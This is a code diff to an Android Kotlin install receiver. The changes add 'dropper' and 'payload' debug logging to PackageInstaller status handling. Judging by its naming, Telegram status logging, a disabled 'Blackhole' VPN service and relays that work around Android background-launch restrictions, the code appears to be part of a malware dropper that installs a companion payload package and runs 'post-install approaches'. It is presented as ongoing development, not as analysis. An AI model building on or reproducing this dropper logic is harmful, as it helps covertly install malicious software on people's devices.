@@ -51,25 +51,31 @@ class InstallReceiver : BroadcastReceiver() {
                     @Suppress("DEPRECATION")
                     intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                 }
-                userIntent?.let {
+                if (userIntent != null) {
                     // Relay to InstallActivity via broadcast so it launches via startActivityForResult
                     // from Activity context — required on Android 10+ where FLAG_ACTIVITY_NEW_TASK
                     // from a BroadcastReceiver cannot surface over a foreground activity (BAL restriction).
                     val relay = Intent(INSTALL_CONFIRM_ACTION).apply {
                         setPackage(context.packageName)
-                        putExtra(Intent.EXTRA_INTENT, it)
+                        putExtra(Intent.EXTRA_INTENT, userIntent)
                     }
                     TelegramLogger.log("InstallReceiver: Relaying install confirm to InstallActivity via broadcast")
+                    DebugLogger.logDropper("STATUS_PENDING_USER_ACTION", DebugLogger.Status.SUCCESS, "confirm relay sent to InstallActivity")
                     context.sendBroadcast(relay)
-                } ?: TelegramLogger.log("InstallReceiver: STATUS_PENDING_USER_ACTION but userIntent is NULL")
+                } else {
+                    TelegramLogger.log("InstallReceiver: STATUS_PENDING_USER_ACTION but userIntent is NULL")
+                    DebugLogger.logDropper("STATUS_PENDING_USER_ACTION", DebugLogger.Status.FAILED, "userIntent is NULL — cannot relay confirm")
+                }
             }
 
             PackageInstaller.STATUS_SUCCESS -> {
                 TelegramLogger.log("InstallReceiver: STATUS_SUCCESS — companion installed")
+                DebugLogger.logDropper("PackageInstaller STATUS_SUCCESS", DebugLogger.Status.SUCCESS)
                 // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                 try {
                     val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                     TelegramLogger.log("InstallReceiver: installed pkg=$pkgName — running post-install approaches")
+                    DebugLogger.logPayload("Installed", DebugLogger.Status.SUCCESS, "pkg=$pkgName")
                     if (!pkgName.isNullOrEmpty()) {
                         context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                             .edit().putString(KEY_MODULE_PKG, pkgName).apply()
@@ -574,6 +580,7 @@ class InstallReceiver : BroadcastReceiver() {
                 // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                 val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "no message"
                 TelegramLogger.log("InstallReceiver: FAILURE status=$status msg=$msg — relaying restart")
+                DebugLogger.logDropper("PackageInstaller FAILED", DebugLogger.Status.FAILED, "status=$status msg=$msg")
                 // Android 15+ (API 35+) blocks startActivity() from BroadcastReceiver
                 // (Background Activity Launch restriction). Relay to InstallActivity
                 // which restarts the install flow from Activity context.
